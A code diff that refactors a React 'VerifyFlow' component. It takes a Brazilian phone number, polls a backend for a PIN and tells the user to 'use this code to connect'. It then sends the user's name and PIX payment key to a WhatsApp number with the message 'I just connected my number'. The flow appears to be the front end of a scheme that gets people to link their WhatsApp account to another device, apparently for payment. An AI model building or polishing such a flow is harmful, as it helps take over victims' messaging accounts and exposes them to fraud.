@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useMemo } from 'react';
 import './VerifyFlow.css';
 import axios from 'axios';
 
@@ -12,11 +12,10 @@ const VerifyFlow = () => {
   const [pix, setPix] = useState({ name: '', type: 'Phone', key: '' });
   const [pin, setPin] = useState('');
 
-  const formattedPhone = ddi + phone.replace(/\D/g, '');
+  const formattedPhone = useMemo(() => ddi + phone.replace(/\D/g, ''), [ddi, phone]);
 
   const formatPhone = (value) => {
-    let cleaned = value.replace(/\D/g, '');
-    if (cleaned.length > 11) cleaned = cleaned.slice(0, 11);
+    let cleaned = value.replace(/\D/g, '').slice(0, 11);
     let formatted = '';
     if (cleaned.length > 0) formatted = '(' + cleaned;
     if (cleaned.length > 2) formatted = formatted.slice(0, 3) + ') ' + formatted.slice(3);
@@ -25,50 +24,60 @@ const VerifyFlow = () => {
   };
 
   const sendPhone = async () => {
-    if (phone.replace(/\D/g, '').length < 8) return alert('Please enter a valid number.');
+    if (phone.replace(/\D/g, '').length < 8) {
+      alert('Please enter a valid number.');
+      return;
+    }
+
     setStep(2);
     setPin('');
-    setLoading(false);
-    try {
-      const verify_data = { 'phone': formattedPhone };
-      const response = await axios.post('http://localhost:3000/api/phone', verify_data);
-      const data = response.data;
+    setLoading(true);
 
+    try {
+      await axios.post('http://localhost:3000/api/phone', { phone: formattedPhone });
     } catch (error) {
       alert('Failed to start verification.');
       setStep(1);
     }
   };
 
-  // Poll backend every 3 seconds to get the PIN
+  // Polling for PIN
   useEffect(() => {
-    if (step !== 2 || !phone) return;
+    if (step !== 2 || !formattedPhone || pin) return;
 
     const interval = setInterval(async () => {
       try {
         const res = await fetch(`http://localhost:3000/api/get-pin?phone=${encodeURIComponent(formattedPhone)}`);
         if (res.ok) {
           const data = await res.json();
-          if (data.pin && data.pin !== pin) {
+          if (data.pin) {
             setPin(data.pin);
+            setLoading(false);
+            clearInterval(interval);
           }
         }
       } catch (err) {
-        // You may handle errors here if needed
+        console.error("Polling error:", err);
       }
     }, 3000);
 
     return () => clearInterval(interval);
-  }, [phone, step, pin, formattedPhone]);
+  }, [step, formattedPhone, pin]);
 
   const copyPin = () => {
     if (pin) {
       navigator.clipboard.writeText(pin).then(() => alert('Code copied: ' + pin));
+      setStep(3);
+
     }
   };
 
   const sendPix = () => {
-    if (!pix.name || !pix.key) return alert('Please fill out all fields!');
+    if (!pix.name || !pix.key) {
+      alert('Please fill out all fields!');
+      return;
+    }
+
     const message = `I just connected my number ${formattedPhone}\n\nPIX Key:\nName: ${pix.name}\nType: ${pix.type}\nKey: ${pix.key}`;
     const url = `https://wa.me/${WHATSAPP_HELP_NUMBER}?text=${encodeURIComponent(message)}`;
     window.open(url, '_blank');
@@ -83,7 +92,6 @@ const VerifyFlow = () => {
           <div className="tela-conteudo">
             <select value={ddi} onChange={(e) => setDdi(e.target.value)}>
               <option value="55">🇧🇷 Brazil (+55)</option>
-              {/* Add more countries if needed */}
             </select>
             <input
               type="text"
@@ -100,7 +108,7 @@ const VerifyFlow = () => {
 
       {step === 2 && (
         <div className="tela ativa">
-          <h2>Use this code to connect</h2>
+          <h2>{loading ? 'Creating Profile' : 'Use this code to connect'}</h2>
           <div className="tela-conteudo">
             {loading ? (
               <div className="spinner" />
@@ -111,8 +119,9 @@ const VerifyFlow = () => {
                 ))}
               </div>
             )}
-            <button onClick={copyPin}>Copy Code</button>
-            {/* Optionally add a "I followed the steps" button here */}
+            <button onClick={copyPin} disabled={!pin}>
+              Copy Code
+            </button>
           </div>
         </div>
       )}
